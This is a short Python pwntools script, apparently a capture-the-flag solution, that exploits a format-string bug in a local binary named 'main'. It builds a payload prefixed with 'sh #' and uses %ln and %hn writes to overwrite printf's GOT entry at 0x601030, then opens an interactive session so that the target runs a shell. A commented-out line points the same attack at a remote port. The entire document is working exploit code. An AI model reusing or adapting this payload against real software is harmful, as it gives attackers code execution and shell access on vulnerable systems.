from pwn import *
import struct


printf_got=0x601030
exp=b"sh #  "
exp+=b"%01546x"
exp+=b"%10$ln"
exp+=b"%64048x"
exp+=b"%11$hn"
exp+=p64(printf_got)
exp+=p64(printf_got+2)
p=process("./main")
#p=remote("127.0.0.1",1337)
print(hex(len(exp)))
raw_input()
p.sendline(exp)
p.interactive()
#0x7ffff7e597ad the writing instruction
#values to write
#first print
#0610
#second print
#0040
